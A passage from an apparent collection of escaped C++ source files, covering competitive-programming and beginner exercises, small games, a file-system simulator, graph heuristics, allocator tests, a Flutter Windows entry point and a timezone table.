dp[i1][k][num]) % mod;\n                        if(j2){\n                            dp[i][k][j1] = (dp[i][k][j1] + dp[i][i1][j2]) % mod;\n                            dp[i][k][j1] = (dp[i][k][j1] + dp[i1][k][divi[j1][j2]]) % mod;\n                        }\n                    }\n                }\n        }\n    int q;\n    cin >> q;\n    while(q--){\n        int l, r, num;\n        cin >> l >> r >> num;\n        num %= m, num = (num + m) % m;\n        cout << dp[l - 1][r][num] << '\\n';\n    }\n    return;\n}\n\nvoid process(){\n\n    return;\n}\n\nvoid get_output(){\n\n\treturn;\n}\n\nsigned main(){\n    ios::sync_with_stdio(0), cin.tie(0);\n\tint t = 1;\n\t//cin >> t;\n\tpreprocess();\n    while(t--){\n        give_input();\n        process();\n        get_output();\n    }\n    return 0;\n}\n",
    "\n// Problem: Find the target in array of  element\n// Given an array of integers, find the sum of element.\n\n// Example:\n// Input: [10, 20, 5, 8, 15]\n// target: 8\n// Output: element found at index: 3\n\n// #include<iostream>\n// using namespace std;\n\n// int main(){\n\n//    int n;\n//   cout<<\"enter size: \";\n//   cin>>n;\n//   int arr[n];\n//   cout<<\"enter element: \";\n//   for(int i = 0; i < n; i++){\n//     cin>>arr[i];\n//   }\n\n//   int target;\n//   cout<<\"enter target: \";\n//   cin>>target;\n\n//   int index = -1;\n\n//   for(int i = 0; i < n; i++){\n//     if(arr[i]==target){\n//       index = i;\n//       break;\n//     }\n//   }\n\n//   if(index == -1){\n//     cout<<\"element not found\"<<endl;}\n//   else{\n//     cout<<\"element found at index: \"<<index<<endl;\n//   }\n\n// }\n\n\n// Problem:\n// Given an array of integers, insert an element at the start of the array by right shifting the elements.\n\n// Example:\n// Input:\n// Array: [10, 20, 30, 40]\n// Element to insert at index 0: 5\n\n// Output:\n// Original array: [10, 20, 30, 40]\n// Updated array: [5, 10, 20, 30, 40]\n\n\n// 1 --> this by creating new array not good method\n\n// #include <iostream>\n// using namespace std;\n\n// int main()\n// {\n//   int n;\n\n//   cout << \"Enter the size of array: \";\n//   cin >> n;\n\n//   int arr[n];\n//   int k;\n\n//   cout << \"Enter the element to be inserted: \";\n//   for (int i = 0; i < n; i++)\n//     cin >> arr[i];\n//   cout << \"Enter the element to be inserted at 0 index: \";\n//   cin >> k;\n//   cout << \"Original array: \";\n//   for (int i = 0; i < n; i++)\n//     cout << arr[i] << \" \";\n//   cout << endl;\n\n//   int brr[n + 1];\n\n//   for (int i = 0; i <= n; i++)\n//   {\n//     if (i == 0)\n//       brr[i] = k;\n//     else\n//     {\n//       brr[i] = arr[i-1];\n//     }\n//   }\n\n//   cout << \"Updated array: \";\n//   for (int i = 0; i < n+1; i++)\n//     cout << brr[i] << \" \";\n//   cout << endl;\n// }\n\n// 2 --> this is done with the help of rightSift and Left shift concept\n\n// #include <iostream>\n// using namespace std;\n\n// int main()\n// {\n//   int n;\n\n//   cout << \"Enter the size of array: \";\n//   cin >> n;\n\n//   int arr[n+1];\n//   int k;\n\n//   cout << \"Enter the element to be inserted: \";\n//   for (int i = 0; i < n; i++)\n//     cin >> arr[i];\n//   cout << \"Enter the element to be inserted at 0 index: \";\n//   cin >> k;\n//   cout << \"Original array: \";\n//   for (int i = 0; i < n; i++)\n//     cout << arr[i] << \" \";\n//   cout << endl;\n\n \n//  //right shift the array element by one\n//   for (int i = n - 1; i >= 0; i--) {\n//         arr[i + 1] = arr[i];\n//     }\n\n//   arr[0] = k;\n\n//   cout << \"Updated array: \";\n//   for (int i = 0; i <= n; i++)\n//     cout << arr[i] << \" \";\n//   cout << endl;\n// }\n\n// g++ -o day1.exe day1.cpp\n// ./day1.exe\n",
    "#include <iostream>\r\n#include <cstdlib>\r\n#include <ctime>\r\n\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    srand(time(0));\r\n    int play(1);\r\n    while (play == 1) {\r\n        cout << \"What will you do ? \" << endl;\r\n        cout << \"Rock (1) \" << endl;\r\n        cout << \"Paper (2) \" << endl;\r\n        cout << \"Scissor (3) \" << endl;\r\n\r\n        int aiChoice = rand() % 3 + 1;\r\n        int playerChoice(0);\r\n\r\n        cin >> playerChoice;\r\n\r\n        if (playerChoice > 3 || playerChoice == 0) {\r\n            while (playerChoice > 3 || playerChoice == 0) {\r\n                cout << \"Choose 1, 2, or 3!\" << endl;\r\n                cin >> playerChoice;\r\n            }\r\n        }\r\n\r\n        cout << \"AI choice: \" << aiChoice << endl;\r\n\r\n        if (playerChoice == aiChoice) {\r\n            cout << \"It's a draw!\" << endl;\r\n        } else if ((playerChoice == 1 && aiChoice == 3) ||\r\n                   (playerChoice == 2 && aiChoice == 1) ||\r\n                   (playerChoice == 3 && aiChoice == 2)) {\r\n            cout << \"You win!\" << endl;\r\n        } else {\r\n            cout << \"You lose!\" << endl;\r\n        }\r\n\r\n        cout << \"Do you want to play again? Yes (1), No (2): \";\r\n        cin >> play;\r\n\r\n        while (play != 1 && play != 2) {\r\n            cout << \"Choose 1 or 2!\" << endl;\r\n            cin >> play;\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "// BeginnerCipher.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\n#include <algorithm>\n#include <string>\n\n// TODO: Write an encoder and decoder function\n\nstd::string encodeMessage(std::string message, int cipherStep) {\n    return \"Finish encoder function.\";\n}\n\nstd::string decodeMessage(std::string codedMessage, int cipherStep) {\n    return \"Finish decoder function.\";\n}\n\nint main()\n{\n    // initialize variables\n    std::string input = \"\";\n    int cipherStep = 1;\n    int alphaStart = 65;\n    int alphaEnd = 122;\n\n    // TODO: Add a prompt for the user to select whether they want to\n    // encode or decode a message.\n\n    // TODO: Run a while loop for repeated use\n\n    // For encoding\n    // Prompt the user for a message to encode.\n    std::cout << \"Please enter the message you would like to have encoded.\\n\";\n    std::getline(std::cin, input);\n\n    // Iterate through the string\n    for (int i = 0; i < input.size(); i++) {\n        // If the character is not a letter, leave as-is\n        if ((int)input[i] < alphaStart || (int)input[i] > alphaEnd) {\n            continue;\n        }\n        else {\n            char encryptLetter = input[i] + cipherStep;\n\n            // Check if encrypted letter is outside of the boundary\n            // for lowercase\n            if (encryptLetter > 'a') {\n                if (encryptLetter > 'z') {\n                    encryptLetter = encryptLetter - 'z' + ('a' - 1);\n                }\n            }\n            // for uppercase\n            else if (encryptLetter > 'A') {\n                if (encryptLetter > 'Z') {\n                    // Loop back around the start of the alphabet\n                    encryptLetter = encryptLetter - 'Z' + ('A' - 1);\n                }\n            }\n\n            input[i] = encryptLetter;\n        }\n        \n    }\n\n    // Print out the encrypted message.\n    std::cout << \"Here is your encoded message:\\n\";\n    std::cout << input;    \n\n    // For decoding\n    // std::cout << \"Please enter a message you would like to have decoded.\\n\"\n    // std::getline(std::cin, input);\n}\n",
    "#include<iostream>\n#include<string>\n#include<cmath>\nusing namespace std;\n\nclass mathoperation{\n  public:\n\tfloat number1,number2;\n   \tmathoperation(float x,float y){\n\t\t  number1=x;\n\t\t  number2=y;\n\t\t  cout<<\"\\nnew transaction\"<<endl;\t\n\t  }\n\t    float addition(){\n\t    \treturn number1+number2;\n\t  }\n\t    float menus(){\n\t\t   return number1-number2;\n      }\n\t    float multiplication(){\n\t\t   return number1*number2;\n\t  }\n\t    float division(){\n\t\t   return number1/number2;\n\t  }\n\t    int sqt(){\n\t\t   return sqrt(number1);\n\t  }\n\t    float paw(){\n\t\t   return pow(number1,number2);\n\t  }\n\t    void getwall(){\n\t\t   cout<<\"addition:\"<<addition()<<endl;\n\t\t   cout<<\"menus:\"<<menus()<<endl;\n\t\t   cout<<\"multiplication: \"<<multiplication()<<endl;\n\t\t   cout<<\"division: \"<<division()<<endl;\n\t\t   cout<<\"pow: \"<<paw()<<endl;\n\t\t   cout<<\"sqrt: \"<<sqrt(number1)<<endl;\n\t\t}\n\t\n};\nint main(){\n\tmathoperation getjab(10.2,6);\n\tgetjab.getwall();\n\tmathoperation getjab1(7.32,3);\n\tgetjab1.getwall();\n\tmathoperation getjab2(12.45,3);\n\tgetjab2.getwall();\n\t\n\t\n\t\n\t\n\t\n\treturn 0;\n}\n\n\n",
    "class Solution {\npublic:\n    int romanToInt(string s) {\n        int number = 0;\n        char cLast = 'N';\n        for(char c : s){\n            switch(c){\n                case 'I':\n                    number += 1;\n                    break;\n                case 'V':\n                    if(cLast == 'I') number += 3;\n                    else number += 5;\n                    break;\n                case 'X':\n                    if(cLast == 'I') number += 8;\n                    else number += 10;\n                    break;\n                case 'L':\n                    if(cLast =='X') number += 30;\n                    else number += 50;\n                    break;\n                case 'C':\n                    if(cLast =='X') number += 80;\n                    else number += 100;\n                    break;\n                case 'D':\n                    if(cLast =='C') number += 300;\n                    else number += 500;\n                    break;\n                case 'M':\n                    if(cLast =='C') number += 800;\n                    else number += 1000;\n                    break;\n            }\n            cLast = c;\n        }\n        return number;\n    }\n};\n",
    "#include <iostream>\nusing namespace std;\n\ntemplate <typename T>\nclass SimpleVector\n{\nprivate:\n\tT* data;      // \ud15c\ud50c\ub9bf\uc744 \ud65c\uc6a9\ud558\uc5ec \ud0c0\uc785\uc5d0 \uc758\uc874\ud558\uc9c0 \uc54a\uace0 \ub370\uc774\ud130\ub97c \ubc1b\ub294 \ubc30\uc5f4 \uc0dd\uc131\n\tint currentSize;\n\tint currentCapacity;\npublic:\n\tvoid printVector()\n\t{\n\t\tcout << \"current size : \" << currentSize << \", current capacity : \" << currentCapacity << endl;\n\t\tcout << \"{ \";\n\t\tfor (int i = 0; i < currentSize; i++)\n\t\t{\n\t\t\tcout << data[i] << \" \";\n\t\t}\n\t\tcout << \"}\" << endl;\n\t}\n\tSimpleVector(int capacity = 10) : currentSize(0), currentCapacity(capacity)\n\t{\n\t\tdata = new T[capacity];    // \ubc30\uc5f4 \ub3d9\uc801 \ud560\ub2f9\n\t}\n\tSimpleVector(const SimpleVector& other) : currentSize(other.currentSize), currentCapacity(other.currentCapacity)\n\t{\n\t\tdata = new T[other.capacity()];\n\t\tfor (int i = 0; i < currentSize; i++)\n\t\t{\n\t\t\tdata[i] = other.data[i];\n\t\t}\n\t}\n\tvoid resize(int newCapacity)\n\t{\n\t\tif (newCapacity > currentCapacity)\n\t\t{\n\t\t\tcurrentCapacity = newCapacity;\n\t\t\tT* newData = new T[currentCapacity];\n\t\t\tfor (int i = 0; i < currentSize; i++)\n\t\t\t{\n\t\t\t\tnewData[i] = data[i];\n\t\t\t}\n\t\t\tdelete[] data;\n\t\t\tdata = newData;\n\t\t}\n\t}\n\tvoid push_back(const T& value)  // \uc778\uc790\ub85c \ubc1b\uc740 \uc6d0\uc18c\ub97c \ub9e8 \ub4a4\uc5d0 \ucd94\uac00\n\t{\n\t\tif (currentSize == currentCapacity) {\n\t\t\tresize(currentCapacity + 5);\n\t\t}\n\t\tdata[currentSize++] = value;\n\t}\n\tvoid pop_back()  // \ubca1\ud130\uc758 \ub9c8\uc9c0\ub9c9 \uc6d0\uc18c \uc81c\uac70\n\t{\n\t\tif (currentSize > 0)\n\t\t{\n\t\t\tcurrentSize--;\n\t\t}\n\t}\n\tint size() const { return currentSize; }\n\tint capacity() const { return currentCapacity; }\n\tvoid sortData()\n\t{\n\t\tdata.sort(data, data + currentSize);\n\t}\n\t~SimpleVector()\n\t{\n\t\tdelete[] data;  // \ub3d9\uc801 \ud560\ub2f9 \uba54\ubaa8\ub9ac \ud574\uc81c\n\t}\n};\n\nint main()\n{\n\tSimpleVector<int> sv(3);\n\tsv.push_back(10);\n\tsv.push_back(20);\n\tsv.push_back(30);\n\tsv.printVector();\n\tsv.pop_back();\n\tsv.printVector();\n\n\tSimpleVector<int> sv_copy(sv);\n\tsv_copy.printVector();\n\n\tsv_copy.push_back(40);\n\tsv_copy.push_back(50);\n\tsv_copy.printVector();\n\n\tsv.printVector();\n\treturn 0;\n}",
    "#include <iostream>\n#include <vector>\n#include <queue>\n#include <string>\n#include <ctime>\n#include <fstream>\n#include <sstream>\n#include \"Node.h\"\n#include \"File.h\"\n#include \"Directory.h\"\n#include \"TextEditor.h\"\nusing namespace std;\n\nstruct PriorityPrint\n{\n    string name;\n    string content;\n    int priority;\n\n    bool operator<(const PriorityPrint& temp) const\n    {\n        return priority < temp.priority;\n    }\n};\npriority_queue<PriorityPrint> priorityPrintQueue;\nstruct Print\n{\n    string name;\n    string content;\n};\nqueue<Print> printQueue;\nstruct PriorityFilePrint\n{\n    string name;\n    string content;\n    int priority;\n    int timeToPrint;\n\n    bool operator<(const PriorityFilePrint& other) const\n    {\n        return priority < other.priority;\n    }\n};\npriority_queue<PriorityFilePrint> priorityFileQueue;\n\nvoid displayAuthorInformation()\n{\n    cout << \"Author: Muhammad Bilal\" << endl;\n    cout << \"Registeration Number: BSCS23146\" << endl;\n    cout << \"Course Name: Data Structures\" << endl;\n}\n\n\n\nvoid findFileRecursive(TreeNode* currentDir, const string& fileName, bool& foundFile, string currentPath)\n{\n    if (Directory* dir = dynamic_cast<Directory*>(currentDir))\n    {\n        for (TreeNode* i : dir->children)\n        {\n            string newPath = currentPath + \"/\" + i->name;\n            if (i->name == fileName)\n            {\n                cout << \"File found at path: \" << newPath << endl;\n                i->displayInformation();\n                foundFile = true;\n                return;\n            }\n            if (Directory* subDir = dynamic_cast<Directory*>(i))\n            {\n                findFileRecursive(subDir, fileName, foundFile, newPath);\n                if (foundFile)\n                {\n                    return;\n                }\n            }\n        }\n    }\n}\nvoid findTextInFile(const string& filePath, const string& searchString)\n{\n    ifstream file(filePath);\n    if (!file.is_open())\n    {\n        cout << \"Cannot open file: \" << filePath << endl;\n        return;\n    }\n\n    string line;\n    int lineNumber = 1;\n    bool found = false;\n\n    while (getline(file, line))\n    {\n        if (line.find(searchString) != string::npos)\n        {\n            cout << \"Found \\\"\" << searchString << \"\\\" in \" << filePath << \" at line \" << lineNumber << \": \" << line << endl;\n            found = true;\n        }\n        lineNumber++;\n    }\n\n    if (!found)\n    {\n        cout << \"\\\"\" << searchString << \"\\\" not found in \" << filePath << endl;\n    }\n\n    file.close();\n}\nvoid formatDirectory(Directory* dir)\n{\n    for (TreeNode* child : dir->children)\n    {\n        if (Directory* subDir = dynamic_cast<Directory*>(child))\n        {\n            formatDirectory(subDir);\n        }\n        delete child;\n    }\n    dir->children.clear();\n}\nDirectory* findDirectory(TreeNode* node, const string& dirName)\n{\n    if (Directory* dir = dynamic_cast<Directory*>(node))\n    {\n        if (dir->name == dirName)\n        {\n            return dir;\n        }\n        for (TreeNode* child : dir->children)\n        {\n            Directory* foundDir = findDirectory(child, dirName);\n            if (foundDir)\n            {\n                return foundDir;\n            }\n        }\n    }\n    return nullptr;\n}\nvoid removeDirectory(Directory* parentDir, const string& dirName)\n{\n    for (vector<TreeNode*>::iterator i = parentDir->children.begin(); i != parentDir->children.end(); ++i)\n    {\n        Directory* tempDir = dynamic_cast<Directory*>(*i);\n        if (tempDir != nullptr && tempDir->name == dirName)\n        {\n            for (TreeNode* child : tempDir->children)\n            {\n                if (Directory* subDir = dynamic_cast<Directory*>(child))\n                {\n                    removeDirectory(tempDir, subDir->name);\n                }\n                else\n                {\n                    delete child;\n                }\n            }\n            tempDir->children.clear();\n            delete tempDir;\n            parentDir->children.erase(i);\n            cout << \"Directory \" << dirName << \" removed.\" << endl;\n            return;\n        }\n    }\n    cout << \"Directory \" << dirName << \" not found in the current directory.\" << endl;\n}\n\n\nvoid processCommands(Directory& root, Directory*& currentDir, const string& command)\n{\n    cout << endl;\n    if (command.substr(0, 6) == \"ATTRIB\")\n    {\n        if (command.length() <= 7) {\n            cout << \"Usage: ATTRIB <filename>\" << endl;\n            return;\n        }\n        string fileName = command.substr(7);\n        bool foundFile = false;\n        for (TreeNode* i : currentDir->children)\n        {\n            if (i->name == fileName)\n            {\n                i->displayInformation();\n                foundFile = true;\n                break;\n            }\n        }\n        if (!foundFile)\n        {\n            cout << \"Couldn't find the File in Current Directory\";\n        }\n    }\n    else if (command.substr(0, 2) == \"CD\")\n    {\n        if (command == \"CD.\")\n        {\n            cout << \"C",
    "\ufeff// \u2705 file verified.\n#include \"incl.h\"\n#include \"decl.h\"\n\n// \u2705 function + comment verified.\n/**\n * @brief Computes a simple heuristic distance between two nodes.\n *\n * @detailed\n * This function calculates the heuristic distance between the `current_node`\n * and the `goal_node` using the absolute difference:\n *\n *     h(n) = |current_node - goal_node|\n *\n * This heuristic is commonly referred to as the Manhattan distance.\n *\n * Functionality:\n * - Computes the absolute difference between `current_node` and `goal_node`.\n * - Used in heuristic-based search algorithms.\n *\n * Properties:\n * - It is admissible if the nodes represent positions on a linear path.\n * - It is consistent since moving from `n` to `n+1` always increases the\n *   cost by at most `1`.\n *\n * @param current_node The starting node.\n * @param goal_node The target node.\n * @param gdata Reference to the graph data.\n * @return The absolute difference between the two nodes.\n *\n * @complexity\n * - Time Complexity: O(1) (Performs a single subtraction and absolute operation).\n * - Space Complexity: O(1) (No additional memory allocated).\n */\n\nstatic inline int baseHeuristicFunc(int current_node, int goal_node, const graph& gdata)\n{\n    int diff = current_node - goal_node;\n    return (diff < 0) ? -diff : diff;\n}\n\n// \u2705 function + comment verified.\n/**\n * @brief Computes a heuristic estimate between two nodes using landmark-based heuristics.\n *\n * @detailed\n * This function implements a more advanced heuristic based on precomputed distances\n * to and from landmarks. It estimates the heuristic cost using the triangle inequality:\n *\n *     h(n) = max{ |d_L(goal) - d_L(n)|, |d_F(n) - d_F(goal)| }\n *\n * where:\n * - `d_L(n)` represents the distance from a landmark to node `n`.\n * - `d_F(n)` represents the distance from node `n` to a landmark.\n *\n * Functionality:\n * - Computes heuristic estimates based on landmark distances.\n * - Uses the triangle inequality to derive a tighter lower bound.\n * - Processes multiple landmarks in an optimized loop.\n *\n * @note\n * - Caching has been removed to enhance performance by eliminating synchronization overhead.\n * - Loop unrolling is employed to reduce iteration overhead and boost performance.\n *\n * @param current_node The starting node.\n * @param goal_node The target node.\n * @param gdata Reference to the graph data.\n * @return The heuristic estimate based on landmark distances.\n *\n * @complexity\n * - Time Complexity: O(L) (L is the number of landmarks used; loop unrolling helps reduce overhead but remains linear).\n * - Space Complexity: O(1) (No caching is used).\n */\nstatic inline int altHeuristicFunc(int current_node, int goal_node, const graph& gdata)\n{\n    if (current_node == goal_node) {\n        return 0;\n    }\n\n    auto it_cur = gdata.node_to_index.find(current_node);\n    auto it_goal = gdata.node_to_index.find(goal_node);\n    if (it_cur == gdata.node_to_index.end() || it_goal == gdata.node_to_index.end()) {\n        return 0;\n    }\n\n    size_t idx_c = it_cur->second;\n    size_t idx_g = it_goal->second;\n\n    const auto& ld_c = gdata.dist_landmark_to[idx_c];\n    const auto& ld_g = gdata.dist_landmark_to[idx_g];\n    const auto& lf_c = gdata.dist_landmark_from[idx_c];\n    const auto& lf_g = gdata.dist_landmark_from[idx_g];\n\n    int best_val = 0;\n    int count_l = (int)ld_c.size();\n\n    const int* ld_c_ptr = ld_c.data();\n    const int* ld_g_ptr = ld_g.data();\n    const int* lf_c_ptr = lf_c.data();\n    const int* lf_g_ptr = lf_g.data();\n\n#define ALT_HEURISTIC_STEP(I)                                 \\\n    {                                                         \\\n        int lg_ = ld_g_ptr[(I)];                              \\\n        int ln_ = ld_c_ptr[(I)];                              \\\n        int nl_ = lf_c_ptr[(I)];                              \\\n        int gl_ = lf_g_ptr[(I)];                              \\\n        if (lg_ < 0 || ln_ < 0 || nl_ < 0 || gl_ < 0)         \\\n            continue;                                         \\\n        int h1_ = lg_ - ln_;                                  \\\n        if (h1_ > best_val) best_val = h1_;                   \\\n        int h2_ = nl_ - gl_;                                  \\\n        if (h2_ > best_val) best_val = h2_;                   \\\n    }\n\n    int i = 0;\n    for (; i + 3 < count_l; i += 4) {\n        ALT_HEURISTIC_STEP(i);\n        ALT_HEURISTIC_STEP(i + 1);\n        ALT_HEURISTIC_STEP(i + 2);\n        ALT_HEURISTIC_STEP(i + 3);\n    }\n    for (; i < count_l; i++) {\n        ALT_HEURISTIC_STEP(i);\n    }\n\n#undef ALT_HEURISTIC_STEP\n\n    if (best_val < 0) {\n        best_val = 0;\n    }\n    return best_val;\n}\n\n// \u2705 function + comment verified.\n/**\n * @brief Computes the heuristic value based on the configuration settings.\n *\n * @detailed\n * This function determines whether to use the base heuristic or an alternative\n * heuristic based on the provided configuration.\n *\n * Functionality:\n * - If `conf.use_alt` is `true`, it calls `altHeuristicFunc()`.\n * - Otherwise, it fal",
    "#include <iostream>\r\n#include <iomanip>\r\nusing namespace std;\r\n\r\nint factorial(int n) {\r\n    int fact = 1;\r\n    for (int i = 2; i <= n; i++)\r\n        fact *= i;\r\n    return fact;\r\n}\r\n\r\n// Function to compute central divided difference table\r\nvoid centralDifferenceTable(double table[][10], double x[], double y[], int n) {\r\n    for (int i = 0; i < n; i++)\r\n        table[i][0] = y[i];\r\n    for (int j = 1; j < n; j++) {\r\n        for (int i = 0; i < n - j; i++) {\r\n            table[i][j] = (table[i + 1][j - 1] - table[i][j - 1]) / (x[i + j] - x[i]);\r\n        }\r\n    }\r\n}\r\n\r\n// Function to interpolate using Newton's central divided difference formula\r\ndouble interpolate(double x[], double table[][10], int n, double xp) {\r\n    double result = table[0][0];\r\n    double h = x[1] - x[0];\r\n    double u = (xp - x[0]) / h;\r\n    for (int i = 1; i < n; i++) {\r\n        double term = table[0][i];\r\n        for (int j = 0; j < i; j++) {\r\n            term *= (u - j);\r\n        }\r\n        term /= factorial(i);\r\n        result += term;\r\n    }\r\n    return result;\r\n}\r\n\r\nint main() {\r\n    int n;\r\n    cout << \"Enter the number of data points: \";\r\n    cin >> n;\r\n    double x[n], y[n];\r\n    cout << \"Enter the data points (x and y):\" << endl;\r\n    for (int i = 0; i < n; i++) {\r\n        cin >> x[i] >> y[i];\r\n    }\r\n    double table[n][10] = {0};\r\n    centralDifferenceTable(table, x, y, n);\r\n    double xp;\r\n    cout << \"Enter the interpolation point: \";\r\n    cin >> xp;\r\n    cout << fixed << setprecision(6);\r\n    cout << \"The interpolated value at x = \" << xp << \" is \" << interpolate(x, table, n, xp) << endl;\r\n    return 0;\r\n}\r\n\r\n",
    "// (c) 2025 Mario \"Neo\" Sieg. <mario.sieg.64@gmail.com>\n\n#include \"prelude.hpp\"\n\nTEST(allocators, fixed_intrusive_pool_alloc_free) {\n    mag_fixed_intrusive_pool pool {};\n    mag_fixed_intrusive_pool_init(&pool, sizeof(int), alignof(int), 8);\n    ASSERT_EQ(pool.num_allocs, 0);\n    ASSERT_EQ(pool.num_chunks, 1);\n    ASSERT_EQ(pool.num_freelist_hits, 0);\n    ASSERT_EQ(pool.num_pool_hits, 0);\n    for (int i = 0; i < 8192; ++i) {\n        int* x = static_cast<int*>(mag_fixed_intrusive_pool_malloc(&pool));\n        ASSERT_EQ(pool.num_allocs, i+1);\n        if (i >= 1) {\n            ASSERT_EQ(pool.num_freelist_hits, i);\n        }\n        *x = -1;\n        ASSERT_EQ(*x, -1);\n        mag_fixed_intrusive_pool_free(&pool, x);\n    }\n    ASSERT_EQ(pool.num_chunks, 1);\n    ASSERT_EQ(pool.num_pool_hits, 1);\n    mag_fixed_intrusive_pool_destroy(&pool);\n}\n\nTEST(allocators, fixed_intrusive_pool_exhaust_pool) {\n    mag_fixed_intrusive_pool pool {};\n    mag_fixed_intrusive_pool_init(&pool, sizeof(int), alignof(int), 8);\n    ASSERT_EQ(pool.num_allocs, 0);\n    ASSERT_EQ(pool.num_chunks, 1);\n    ASSERT_EQ(pool.num_freelist_hits, 0);\n    ASSERT_EQ(pool.num_pool_hits, 0);\n    for (int i = 0; i < 8192; ++i) {\n        [[maybe_unused]] int* volatile x = static_cast<int*>(mag_fixed_intrusive_pool_malloc(&pool));\n    }\n    ASSERT_EQ(pool.num_chunks, 8192/8);\n    //ASSERT_EQ(pool.num_pool_hits, 1);\n    ASSERT_EQ(pool.num_freelist_hits, 0);\n    mag_fixed_intrusive_pool_destroy(&pool);\n}\n\n#ifndef _MSC_VER // MSVC fucks around with linking a __declspex(dllexport) ed function ptr. TODO: fix\n\nTEST(allocators, alloc_small) {\n    int* i = static_cast<int*>((*mag_alloc)(nullptr, sizeof(int)));\n    ASSERT_NE(i, nullptr);\n    *i = -1;\n    ASSERT_EQ(*i, -1);\n    (*mag_alloc)(i, 0);\n}\n\nTEST(allocators, alloc_large) {\n    void* i = (*mag_alloc)(nullptr, 1ull<<30);\n    ASSERT_NE(i, nullptr);\n    std::memset(i, 5, 1ull<<30);\n    (*mag_alloc)(i, 0);\n}\n\n#endif\n\nTEST(allocators, alloc_aligned) {\n    std::size_t align = alignof(int);\n    for (; align <= 8192; align <<= 1) {\n        int* i = static_cast<int*>(mag_alloc_aligned(sizeof(int), align));\n        ASSERT_NE(i, nullptr);\n        *i = -1;\n        ASSERT_EQ(*i, -1);\n        ASSERT_EQ(reinterpret_cast<std::uintptr_t>(i) % align, 0);\n        mag_free_aligned(i);\n    }\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"ecommercepratics\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"Zones.h\"\n#include \"ClockWebServer.h\"\n#include <WebServer.h>\n\nextern WebServer *webServer;\nstatic const String zones_list PROGMEM = R\"(\n{\n    \"Africa/Abidjan\": \"GMT0\",\n    \"Africa/Accra\": \"GMT0\",\n    \"Africa/Addis_Ababa\": \"EAT-3\",\n    \"Africa/Algiers\": \"CET-1\",\n    \"Africa/Asmara\": \"EAT-3\",\n    \"Africa/Bamako\": \"GMT0\",\n    \"Africa/Bangui\": \"WAT-1\",\n    \"Africa/Banjul\": \"GMT0\",\n    \"Africa/Bissau\": \"GMT0\",\n    \"Africa/Blantyre\": \"CAT-2\",\n    \"Africa/Brazzaville\": \"WAT-1\",\n    \"Africa/Bujumbura\": \"CAT-2\",\n    \"Africa/Cairo\": \"EET-2EEST,M4.5.5/0,M10.5.4/24\",\n    \"Africa/Casablanca\": \"<+01>-1\",\n    \"Africa/Ceuta\": \"CET-1CEST,M3.5.0,M10.5.0/3\",\n    \"Africa/Conakry\": \"GMT0\",\n    \"Africa/Dakar\": \"GMT0\",\n    \"Africa/Dar_es_Salaam\": \"EAT-3\",\n    \"Africa/Djibouti\": \"EAT-3\",\n    \"Africa/Douala\": \"WAT-1\",\n    \"Africa/El_Aaiun\": \"<+01>-1\",\n    \"Africa/Freetown\": \"GMT0\",\n    \"Africa/Gaborone\": \"CAT-2\",\n    \"Africa/Harare\": \"CAT-2\",\n    \"Africa/Johannesburg\": \"SAST-2\",\n    \"Africa/Juba\": \"CAT-2\",\n    \"Africa/Kampala\": \"EAT-3\",\n    \"Africa/Khartoum\": \"CAT-2\",\n    \"Africa/Kigali\": \"CAT-2\",\n    \"Africa/Kinshasa\": \"WAT-1\",\n    \"Africa/Lagos\": \"WAT-1\",\n    \"Africa/Libreville\": \"WAT-1\",\n    \"Africa/Lome\": \"GMT0\",\n    \"Africa/Luanda\": \"WAT-1\",\n    \"Africa/Lubumbashi\": \"CAT-2\",\n    \"Africa/Lusaka\": \"CAT-2\",\n    \"Africa/Malabo\": \"WAT-1\",\n    \"Africa/Maputo\": \"CAT-2\",\n    \"Africa/Maseru\": \"SAST-2\",\n    \"Africa/Mbabane\": \"SAST-2\",\n    \"Africa/Mogadishu\": \"EAT-3\",\n    \"Africa/Monrovia\": \"GMT0\",\n    \"Africa/Nairobi\": \"EAT-3\",\n    \"Africa/Ndjamena\": \"WAT-1\",\n    \"Africa/Niamey\": \"WAT-1\",\n    \"Africa/Nouakchott\": \"GMT0\",\n    \"Africa/Ouagadougou\": \"GMT0\",\n    \"Africa/Porto-Novo\": \"WAT-1\",\n    \"Africa/Sao_Tome\": \"GMT0\",\n    \"Africa/Tripoli\": \"EET-2\",\n    \"Africa/Tunis\": \"CET-1\",\n    \"Africa/Windhoek\": \"CAT-2\",\n    \"America/Adak\": \"HST10HDT,M3.2.0,M11.1.0\",\n    \"America/Anchorage\": \"AKST9AKDT,M3.2.0,M11.1.0\",\n    \"America/Anguilla\": \"AST4\",\n    \"America/Antigua\": \"AST4\",\n    \"America/Araguaina\": \"<-03>3\",\n    \"America/Argentina/Buenos_Aires\": \"<-03>3\",\n    \"America/Argentina/Catamarca\": \"<-03>3\",\n    \"America/Argentina/Cordoba\": \"<-03>3\",\n    \"America/Argentina/Jujuy\": \"<-03>3\",\n    \"America/Argentina/La_Rioja\": \"<-03>3\",\n    \"America/Argentina/Mendoza\": \"<-03>3\",\n    \"America/Argentina/Rio_Gallegos\": \"<-03>3\",\n    \"America/Argentina/Salta\": \"<-03>3\",\n    \"America/Argentina/San_Juan\": \"<-03>3\",\n    \"America/Argentina/San_Luis\": 